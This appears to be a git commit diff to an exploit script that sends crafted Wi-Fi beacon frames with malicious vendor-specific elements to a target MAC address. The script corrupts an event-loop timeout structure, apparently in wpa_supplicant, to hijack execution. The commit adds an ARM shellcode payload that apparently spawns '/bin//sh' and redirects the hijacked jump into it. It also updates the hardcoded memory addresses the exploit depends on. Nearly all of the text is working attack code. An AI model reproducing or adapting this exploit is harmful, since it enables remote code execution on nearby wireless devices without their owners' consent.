49f03c8d9152e5058a66d2aaffec7029594e0399
tkt-ino <100588602+tkt-ino@users.noreply.github.com>
2024-05-31 02:56:24 -0400

    add shellcode

--- skeleton.py
+++ skeleton.py
@@ -20,18 +20,20 @@ args = parser.parse_args()
 iface = args.interface        # interface in monitor mode
 target = args.target          # target MAC address
 
-base  = 0x5570271000         # base address of main module
+base  = 0x5583ac6000         # base address of main module
 
 eloop = 0x7fb6e32780          # eloop_timeout address
-p2    = 0x7fb6e2f320          # second part of payload
+p2    = 0x7fb6e275a0          # second part of payload
 
 eloop_next = base + 0x1f0770  # eloop next (&list terminates)
 wpa_printf = base + 0x027d48  # addr of wpa_printf
 
 msg = b"hi :)"                # log on success (< 8 bytes)
-frees = [eloop-0x20]          # list of addrs to free (up to 10)
-# frees = []                    # list of addrs to free (up to 10)
+# frees = [eloop-0x20]          # list of addrs to free (up to 10)
+frees = []                    # list of addrs to free (up to 10)
 sec_devs = 0x12+len(frees)    # number of secondary device types
+
+shellcode = b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0e\x30\x01\x90\x49\x1a\x92\x1a\x08\x27\xc2\x51\x03\x37\x01\xdf\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
 
 p64 = lambda x: struct.pack("<Q", x)
 
@@ -64,8 +66,8 @@ def build_beacon(dev_mac, client_mac):
         p64(eloop) +                 # previous: address of ext_data1
         p64(0) + p64(0) +            # times set to 0 so it runs right away
         p64(5) + p64(p2+0x38) +      # error level, address of msg 
-        p64(wpa_printf) +            # addr of wpa_printf to jump to 
-        msg + b"\x00"*(8-len(msg)))  # message and null padding
+        p64(p2+0x38) +            # addr of wpa_printf to jump to 
+        shellcode)
 
     vendor2 = Dot11EltVendorSpecific(oui=0x0050f2, info=(
         b"\x04\x10\x49" +                    # vendor extension id
